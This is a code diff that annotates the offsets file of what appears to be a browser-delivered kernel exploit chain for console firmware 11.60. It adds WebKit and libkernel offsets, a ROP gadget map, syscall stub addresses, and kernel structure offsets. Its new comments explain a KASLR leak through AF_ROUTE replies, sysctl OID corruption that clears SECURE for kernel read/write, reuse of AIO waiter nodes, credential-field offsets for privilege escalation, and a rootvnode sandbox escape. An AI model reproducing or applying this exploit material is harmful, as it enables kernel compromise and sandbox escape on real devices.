@@ -1,10 +1,15 @@
+/* -- libSceNKWebKit ------------------------------------------------------- */
+
+// webkitBase = nativeCtorAddr - candidate; main.js tries each in turn.
 const OFFSET_wk_host_constructor_candidates = [
   0x0001e0d8, 0x0001e320, 0x0001f368,
 ];
-
+// Exact WKDownloadGetTypeID export (NID -x5vK4NNNYM).
 const OFFSET_wk_vtable_first_element = 0x00151300;
 const OFFSET_wk_memset_import = 0x034f7da0;
 const OFFSET_wk___stack_chk_guard_import = 0x034f5718;
+
+/* -- libkernel_web -------------------------------------------------------- */
 
 const OFFSET_lk___stack_chk_guard = 0x0006d1d0;
 const OFFSET_lk__thread_list = 0x00064218;
@@ -26,6 +31,8 @@ const OFFSET_lk_scePthreadAttrSetstacksize = 0x0000c2a0;
 const OFFSET_lk_scePthreadAttrSetdetachstate = 0x0000bcb0;
 const OFFSET_lk_scePthreadAttrDestroy = 0x000100c0;
 
+/* -- libSceLibcInternal --------------------------------------------------- */
+
 const OFFSET_lc_malloc = 0x00005eb0;
 const OFFSET_lc_free = 0x00005ec0;
 const OFFSET_lc_memcpy = 0x00003d50;
@@ -36,7 +43,10 @@ const OFFSET_lc_vsnprintf = 0x0005c430;
 const OFFSET_lc_setjmp = 0x0005ad30;
 const OFFSET_lc_longjmp = 0x0005ad80;
 
+// Fallback estimate only; main.js fingerprints the saved worker PC at runtime.
 const OFFSET_WORKER_STACK_OFFSET = 0x0007fb68;
+
+/* -- ROP gadgets (libSceNKWebKit) ----------------------------------------- */
 
 const wk_gadgetmap = {
   ret: 0x000000c7,
@@ -66,6 +76,8 @@ const wk_gadgetmap = {
   "shr rax, 4": 0x01b6c0d3,
   infloop: 0x000031c1,
 };
+
+/* -- libkernel_web syscall stubs, by syscall number ----------------------- */
 
 const syscall_map = {
   0x001: 0x0001b53a,
@@ -401,6 +413,8 @@ const syscall_map = {
   0x2dd: 0x0001aea0,
 };
 
+/* -- kernel, harness-facing ----------------------------------------------- */
+
 const OFFSET_KERNEL_DATA = 0x00d30000;
 const OFFSET_KERNEL_ALLPROC = 0x035a5d70;
 const OFFSET_KERNEL_ROOTVNODE = 0x03de7510;
@@ -409,13 +423,17 @@ const OFFSET_KERNEL_TARGETID = 0x01abc06d;
 const OFFSET_KERNEL_QA_FLAGS = 0x01abc088;
 const OFFSET_KERNEL_UTOKEN_FLAGS = 0x01abc0f0;
 
+/* -- kernel, exploit-facing ------------------------------------------------ */
+
 window.KRW = {
   firmware: "11.60",
 
   kernelData: OFFSET_KERNEL_DATA,
   allproc: OFFSET_KERNEL_ALLPROC,
-  rootvnode: OFFSET_KERNEL_ROOTVNODE,
+  rootvnode: OFFSET_KERNEL_ROOTVNODE, // the static global, read once for the sandbox escape
 
+  // KASLR leak. "rtmsg2" reads the kernel return address Sony leaves in the
+  // author record of an AF_ROUTE RTM_ADD reply; kbase = ret - retStatic.
   kaslr: {
     mode: "rtmsg2",
     retStatic: 0x00b53301,
@@ -423,27 +441,32 @@ window.KRW = {
   },
 
   oid: {
-    originalKind: 0x80048002,
-    writableKind: 0x70048002,
+    originalKind: 0x80048002, // CTLTYPE_INT | RW | SECURE
+    writableKind: 0x70048002, // SECURE cleared, ANYBODY set
 
+    // kern.smp.cpus -- steers at b.arg1 and becomes the low-dword writer.
     a: {
       base: 0x02929ed0,
-      kind: 0x02929eec,
-      kindByte3: 0x02929eef,
-      arg1: 0x02929ef0,
-      arg1Byte1: 0x02929ef1,
-      arg1Value: 0x02929ec8,
-      deadSink: 0x02929ef8,
+      kind: 0x02929eec, // oid+0x1c
+      kindByte3: 0x02929eef, // 16 decrements take 0x80 -> 0x70
+      arg1: 0x02929ef0, // oid+0x20
+      arg1Byte1: 0x02929ef1, // 1 decrement: arg1 -= 0x100 => &b.arg1
+      arg1Value: 0x02929ec8, // what a.arg1 points at untouched
+      deadSink: 0x02929ef8, // a.oid_arg2, never read while arg1 != 0
     },
 
+    // kern.smp.maxcpus -- the address window. Hidden until un-hidden.
     b: {
       base: 0x02929da8,
       kind: 0x02929dc4,
       kindByte3: 0x02929dc7,
-      arg1: 0x02929dc8,
+      arg1: 0x02929dc8, // steer target; +4 is its high dword
       arg1Value: 0x02929ce0,
-      visible: 0x02929e00,
+      visible: 0x02929e00, // 1 decrement: 0 -> 0xffffffff un-hides b
     },
+
+    // p1003_1b.priority_scheduling -- aimed at &b.arg1+4 so the window's
+    // high dword can be written unconditionally. Static MIB, no name2oid.
     c: {
       base: 0x02c4cb90,
       kind: 0x02c4cbac,
@@ -453,19 +476,26 @@ window.KRW = {
     },
   },
 
+  // p1003_1b.prioritized_io: inert BSS the kernel never touches, reachable
+  // through a static MIB. Counts decrement walks without a name2oid lookup.
   walkCounter: { addr: 0x03d670b8, mib: [9, 7] },
+
+  // A reclaimed waiter node's +0x10 must hold a mutex STRUCT base, which the
+  // walker locks at +0x18. This is usb_quirk_mtx's lockword minus 0x18.
   nodeMutex: 0x03b77e20,
+
+  // .rodata the fast R/W is proved against: two adjacent C strings.
   rodataProbe: { rva: 0x011a7987, text: "_aio_submit_cmd\0_aio_multi_wait" },
 
   aio: {
-    waiterSize: 0x38,
-    requestSize: 0x28,
+    waiterSize: 0x38, // sizeof waiter node, sets the UMA zone
+    requestSize: 0x28, // sizeof submitted request, must share it
     group: { num: 0x00, state: 0x08, waiters: 0x50 },
     idTable: { pages: 0x220, slotStride: 0x30, entryType: 0x160 },
   },
 
   proc: { pid: 0x0bc, ucred: 0x040, fd: 0x048, aioInfo: 0xc40, dynlib: 0x3e8 },
-  kernelPid: 0,
+  kernelPid: 0, // the proc whose fd_cdir is rootvnode
 
   ucred: {
     uid: 0x04,
@@ -480,6 +510,8 @@ window.KRW = {
     sceAttrs: 0x80,
   },
   sysCoreAuthId: { lo: 0x00000007, hi: 0x48000000 },
+
+  // fget_unlocked walks filedesc -> fd_files -> ofiles[fd] -> f_data.
   filedesc: { files: 0x00, cdir: 0x08, rdir: 0x10, jdir: 0x18 },
   filedescTable: {
     nfiles: 0x00,
@@ -505,6 +537,12 @@ window.KRW = {
     libkernelRef: 0x18,
   },
 };
+
+/* -- symbols the kexp handoff patches into its shellcode -------------------
+ *
+ * Anything omitted here is parsed out of the in-process module image at
+ * runtime instead, so a new firmware only has to fill in what it already knows.
+ */
 
 window.SYMBOLS = {
   libkernel: {
